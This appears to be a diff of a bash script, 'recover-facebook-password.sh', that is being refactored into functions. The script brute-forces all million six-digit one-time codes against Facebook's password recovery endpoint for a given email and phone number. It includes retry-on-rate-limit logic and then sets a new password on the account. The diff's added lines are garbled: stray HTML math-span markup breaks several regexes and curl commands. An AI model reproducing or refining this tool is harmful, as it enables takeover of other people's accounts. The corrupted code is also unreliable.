@@ -11,92 +11,105 @@
 # ./recover-facebook-password.sh john.doe@example.com +2376537127 newpassword123
 
 # Check if the user has entered a valid email address
-if ! [[ $1 =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
- echo "Invalid email address."
- exit 1
-fi
+function check_email_address() {
+  if ! [[ <span class="math-inline">1 \=\~ ^\[a\-zA\-Z0\-9\.\_%\+\-\]\+@\[a\-zA\-Z0\-9\.\-\]\+\\\.\[a\-zA\-Z\]\{2,\}</span> ]]; then
+    echo "Invalid email address."
+    exit 1
+  fi
+}
 
 # Check if the user has entered a valid phone number
-if ! [[ $2 =~ ^\+[0-9]{1,3}[0-9]{7,14}$ ]]; then
- echo "Invalid phone number."
- exit 1
-fi
+function check_phone_number() {
+  if ! [[ <span class="math-inline">1 \=\~ ^\\\+\[0\-9\]\{1,3\}\[0\-9\]\{7,14\}</span> ]]; then
+    echo "Invalid phone number."
+    exit 1
+  fi
+}
 
 # Prompt the user to enter the OTP if they have it
-echo "Do you have an OTP? (y/n)"
-read has_otp
+function get_otp() {
+  echo "Do you have an OTP? (y/n)"
+  read has_otp
 
-if [[ $has_otp == "y" ]]; then
- # Check if the user has already entered a valid OTP
- echo "Enter the OTP you have already tried: "
- read -s otp
+  if [[ $has_otp == "y" ]]; then
+    echo "Enter the OTP you have already tried: "
+    read -s otp
 
- # If the user has entered an OTP, check if it is valid
- if [ -n "$otp" ]; then
-  response=$(curl -i -s -k -X GET "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}&otp=${otp}")
+    if [ -n "$otp" ]; then
+      return <span class="math-inline">otp
+fi
+fi
+return ""
+\}
+\# Set the curl command options
+CURL\_OPTIONS\="\-i \-s \-k \-X GET"
+\# Get the headers and cookies from the URL
+function get\_headers\_and\_cookies\(\) \{
+HEADERS\=</span>(curl <span class="math-inline">CURL\_OPTIONS "https\://www\.facebook\.com/recover/code/?ph%5B0%5D\=</span>{2}")
+
+  # Extract the cookies from the headers
+  COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")
+
+  echo "$HEADERS"
+  echo "$COOKIES"
+}
+
+# Make a POST request
+function make_post_request() {
+  local headers=$1
+  local cookies=$2
+  local post_data=$3
+  local url=<span class="math-inline">4
+response\=</span>(curl $CURL_OPTIONS $headers -b "$cookies" --data-binary "$post_data" "$url")
+
+  echo "$response"
+}
+
+# Check if the OTP was correct
+function check_otp_correct() {
+  local response=$1
 
   if grep -q "Password changed successfully" <<< "$response"; then
-    echo "Found the correct OTP: $otp"
-    echo "Password changed successfully!"
-    exit 0
-  fi
- fi
-fi
-
-# Set the curl command options
-CURL_OPTIONS="-i -s -k -X GET"
-
-# Get the headers and cookies from the URL
-HEADERS=$(curl $CURL_OPTIONS "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}")
-
-# Extract the cookies from the headers
-COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")
-
-# Set the HTTP headers
-# Use the extracted headers from the previous step
-HEADERS="-H Host: www.facebook.com"
-# ... Include all the other headers you provided
-
-# Iterate over all possible OTP combinations
-for ((i=0; i<10**6; i++)); do
- OTP=$(printf "%06d" $i) # Pad OTP with leading zeros if necessary
- POST_DATA="jazoest=2848&lsd=AVpZiJFH41I&n=004222&email=${1}&reset_action=1&otp=${OTP}"
-
- # Make the POST request
- response=$(curl $CURL_OPTIONS $HEADERS -b "$COOKIES" --data-binary "$POST_DATA" "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}")
-
- # Check if the OTP was correct
- if grep -q "Password changed successfully" <<< "$response"; then
-  echo "Found the correct OTP: $OTP"
-
-  # Change the password using the cracked OTP
-  NEW_PASSWORD=$3
-  change_password_response=$(curl $CURL_OPTIONS $HEADERS -b "$COOKIES" --data "new_password=${NEW_PASSWORD}" "https://www.facebook.com/change_password/?ph%5B0%5D=${2}")
-
-  # Check if the password was changed successfully
-  if grep -q "Password successfully changed" <<< "$change_password_response"; then
-    echo "Password changed successfully!"
+    echo "true"
   else
-    echo "Failed to change password."
+    echo "false"
+  fi
+}
+
+# Change the password using the cracked OTP
+function change_password() {
+  local headers=$1
+  local cookies=$2
+  local new_password=<span class="math-inline">3
+change\_password\_response\=</span>(curl $CURL_OPTIONS $headers -b "<span class="math-inline">cookies" \-\-data "new\_password\=</span>{new_password}" "https://www.facebook.com/change_password/?ph%5B0%5D=${2}")
+
+  echo "$change_password_response"
+}
+
+# Check if the password was changed successfully
+function check_password_changed() {
+  local response=$1
+
+  if grep -q "Password successfully changed" <<< "$response"; then
+    echo "true"
+  else
+    echo "false"
+  fi
+}
+
+# Handle rate limiting
+function handle_rate_limiting() {
+  local response=$1
+
+  if grep -q "Too many requests" <<< "$response"; then
+    echo "Rate limited. Retrying in 60 seconds..."
+    sleep 60
+    return 1
   fi
 
-  break
- fi
-
- # Handle rate limiting
- if grep -q "Too many requests" <<< "$response"; then
-  echo "Rate limited. Retrying in 60 seconds..."
-  sleep 60
-  continue
- fi
-done
-
-# If the script reaches this point, it was unable to find the correct OTP
-echo "Failed to find the correct OTP."
-exit 1
+  return 0
+}
 
 # Check if the new password is strong enough
-if [[ ! $NEW_PASSWORD =~ ^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^\da-zA-Z])(?=.{12,})$ ]]; then
- echo "Password must be at least 12 characters long and contain a mix of upper and lowercase letters, numbers, and symbols."
- exit 1
-fi
+function check_password_strength() {
+  local new_password
